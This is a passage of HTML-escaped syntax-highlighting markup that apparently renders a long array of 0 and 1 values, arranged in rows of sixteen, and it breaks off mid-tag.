	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	
	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span 